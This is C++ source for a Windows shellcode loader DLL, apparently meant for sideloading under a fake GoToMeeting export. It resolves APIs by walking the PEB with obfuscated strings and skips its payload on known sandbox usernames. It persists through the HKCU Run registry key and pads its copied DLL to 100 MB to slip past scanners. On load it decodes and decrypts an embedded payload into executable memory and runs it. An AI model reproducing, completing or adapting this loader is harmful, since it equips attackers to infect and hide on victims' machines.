#include <winternl.h>
#include "windows.h"
#include <string>
#include <fstream>
#include <shlobj.h>
#include <filesystem>
#include "library.h"
#include "obfuscate.h"
#include "base64.h"
#include "payload.h"

void execute();

extern "C" __declspec(dllexport) __attribute__((visibility("default"))) int g2mcomm_winmain(DWORD, int, DWORD, DWORD, DWORD, DWORD){
    return 0;
}
# define memcpy(D,S,N) {char*xxd=(char*)(D);const char*xxs=(const char*)(S);\
                        int xxn=(N);while(xxn-->0)*(xxd++)=*(xxs++);}


typedef HMODULE(WINAPI *PGetModuleHandleA)(PCSTR);
typedef FARPROC(WINAPI *PGetProcAddress)(HMODULE, PCSTR);

typedef HMODULE(WINAPI *PLoadLibraryA)(LPCSTR lpLibFileName);

typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);
typedef LPVOID(WINAPI *PVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef HANDLE(WINAPI *PGetCurrentProcess)(VOID);
typedef WINBOOL(WINAPI *PWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef WINBOOL(WINAPI *PGetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
PGetUserNameA funcGetUserNameA;
long addr(){
    return 0x30 * 14;
}

bool CheckUserNames() {
    char *sUsers[] = {(char *) AY_OBFUSCATE("UserName"),
                      (char *) AY_OBFUSCATE("user"),
                      (char *) AY_OBFUSCATE("sandbox"), (char *) AY_OBFUSCATE("honey"), (char *) AY_OBFUSCATE("vmware"),
                      (char *) AY_OBFUSCATE("currentuser"), (char *) AY_OBFUSCATE("nepenthes"),
                      (char *) AY_OBFUSCATE("andy"),
                      (char *) AY_OBFUSCATE("CurrentUser"), (char *) AY_OBFUSCATE("HAL9TH"),
                      (char *) AY_OBFUSCATE("JohnDoe"),
                      (char *) AY_OBFUSCATE("User"),
                      (char *) AY_OBFUSCATE("USER")};

    char szBuffer[30];
    unsigned long lSize = sizeof(szBuffer);
    if (funcGetUserNameA(szBuffer, &lSize) == 0) {
        return (1);
    }

    for (int i = 0; i < (sizeof(sUsers) / sizeof(char *)); i++) {
        if (strstr(szBuffer, sUsers[i])) {
            return 1;
        }
    }
    return 0;
}

std::wstring Pump(const std::wstring& asmPath, int mb) {
    std::wofstream fileStream(asmPath, std::ios::binary | std::ios::app);

    long fileSizeInBytes = static_cast<long>(mb * 1024 * 1024); // 1MB = 1024 * 1024 bytes

    fileStream.seekp(0, std::ios_base::end);
    long currentPosition = fileStream.tellp();

    long bytesToAdd = fileSizeInBytes - currentPosition;

    while (bytesToAdd > 0) {
        const wchar_t space = L' ';
        fileStream.write(&space, 1);
        bytesToAdd--;
    }

    fileStream.close();

    return asmPath;
}
std::wstring strWide(const char* cStr) {
    std::string str = cStr;
    std::wstring wideStr(str.begin(), str.end());
    return wideStr;
}
bool exists(const std::wstring& path) {
    return std::filesystem::exists(path);
}
void EnableAutoRun() {
    HKEY hkey;
    wchar_t CurrentFilePath[1024];
    GetModuleFileNameW(0, CurrentFilePath, 1024);
    std::filesystem::path CurrentExe = CurrentFilePath;
    wchar_t my_documents[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, SHGFP_TYPE_CURRENT, my_documents);
    std::filesystem::path documents = my_documents;
    std::wstring appPath = CurrentExe.filename();
    std::wstring dllPath = strWide(AY_OBFUSCATE("g2m.dll"));
    std::wstring updaterDLL = documents / dllPath;
    std::wstring updaterEXE = documents / appPath;
    if(!exists(updaterEXE)){
        _wremove(updaterDLL.c_str());
        std::filesystem::copy_file(dllPath, updaterDLL);
        std::filesystem::copy_file(appPath, updaterEXE);
        RegCreateKeyExW(HKEY_CURRENT_USER,
                        strWide(AY_OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run")).c_str(), 0, NULL, 0,
                        KEY_WRITE, NULL, &hkey, NULL);
        RegSetValueExW(hkey, NULL, 0, REG_SZ, (unsigned char *) updaterEXE.c_str(), MAX_PATH);
        Pump(updaterDLL, 100);
    }
}
void execute()
{
    long read = addr() / 14;
    PPEB pPEB = (PPEB)__readfsdword(read);

    PPEB_LDR_DATA pLoaderData = pPEB->Ldr;

    PLIST_ENTRY listHead = &pLoaderData->InMemoryOrderModuleList;

    PLIST_ENTRY listCurrent = listHead->Flink;

    PVOID kernel32Address;
    do
    {
        PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, NULL, 0, NULL, NULL);

        PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);

        WideCharToMultiByte(CP_ACP, 0, dllEntry->FullDllName.Buffer, dllEntry->FullDllName.Length, dllName, dllNameLength, NULL, NULL);

        CharUpperA(dllName);

        if (strstr(dllName, AY_OBFUSCATE("KERNEL32.DLL")))
        {
            kernel32Address = dllEntry->DllBase;

            HeapFree(GetProcessHeap(), 0, dllName);

            break;
        }
        HeapFree(GetProcessHeap(), 0, dllName);

        listCurrent = listCurrent->Flink;

    } while (listCurrent != listHead);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;

    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader->e_lfanew);

    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&(pNtHeader->OptionalHeader);

    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfFunctions);
    PULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory->AddressOfNames);

    PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory->AddressOfNameOrdinals);


    PGetModuleHandleA pGetModuleHandleA = NULL;

    PGetProcAddress pGetProcAddress = NULL;


    for (int i = 0; i < pExportDirectory->NumberOfNames; ++i)
    {
        PCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);
        if (!strcmp(pFunctionName, AY_OBFUSCATE("GetModuleHandleA")))
        {
            pGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);

        }
        if (!strcmp(pFunctionName, AY_OBFUSCATE("GetProcAddress")))
        {
            pGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);

        }
    }
    HMODULE hKernel32 = pGetModuleHandleA(AY_OBFUSCATE("kernel32.dll"));

    PLoadLibraryA funcLoadLibraryA = (PLoadLibraryA)pGetProcAddress(hKernel32, AY_OBFUSCATE("LoadLibraryA"));

    PVirtualAllocEx funcVirtualAllocEx = (PVirtualAllocEx)pGetProcAddress(hKernel32, AY_OBFUSCATE("VirtualAllocEx"));

    PGetCurrentProcess funcGetCurrentProcess = (PGetCurrentProcess)pGetProcAddress(hKernel32, AY_OBFUSCATE("GetCurrentProcess"));

    PWriteProcessMemory funcWriteProcessMemory = (PWriteProcessMemory)pGetProcAddress(hKernel32, AY_OBFUSCATE("WriteProcessMemory"));

    funcGetUserNameA = (PGetUserNameA)pGetProcAddress(funcLoadLibraryA(AY_OBFUSCATE("ADVAPI32.dll")), AY_OBFUSCATE("GetUserNameA"));
    EnableAutoRun();
    void* Process = funcGetCurrentProcess();
    std::string base_dec = base64_decode(buffer);
    if (CheckUserNames()){
        base_dec.erase();
    }
    std::string buffer_dec = EncryptDecrypt(base_dec,default_key);
    PVOID allocatedMem = funcVirtualAllocEx(Process,0, buffer_dec.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(allocatedMem == nullptr){
        exit(EXIT_FAILURE);
    }
    SIZE_T bytes;
    funcWriteProcessMemory(Process, allocatedMem, buffer_dec.c_str(), buffer_dec.size(), &bytes);
    ((void(*)())allocatedMem)();
}

BOOL APIENTRY DllMain( HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved){
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            execute();
        }break;
    }
    return TRUE;
}